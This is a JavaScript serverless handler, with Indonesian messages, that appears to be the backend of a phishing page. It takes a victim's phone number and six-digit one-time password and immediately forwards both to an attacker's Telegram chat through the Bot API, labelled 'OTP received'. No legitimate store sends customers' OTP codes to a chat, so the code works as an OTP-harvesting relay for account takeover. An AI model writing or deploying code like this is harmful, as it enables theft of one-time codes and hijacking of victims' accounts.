export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { phone, otp } = req.body;

  if (!phone || !otp || otp.length !== 6) {
    return res.status(400).json({ error: 'Data OTP tidak valid' });
  }

  const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

  const text = `
🔑 *OTP DITERIMA - STORE*
━━━━━━━━━━━━━━━━
📱 *No. HP:* ${phone}
🔢 *Kode OTP:* \`${otp}\`
🕐 *Waktu:* ${waktu}
  `.trim();

  try {
    const tgRes = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text, parse_mode: 'Markdown'
        })
      }
    );
    const tgData = await tgRes.json();
    if (!tgData.ok) throw new Error(tgData.description);
    res.status(200).json({ success: true });
  } catch (err) {
    console.error('Telegram error:', err);
    res.status(500).json({ error: 'Gagal kirim ke Telegram' });
  }
}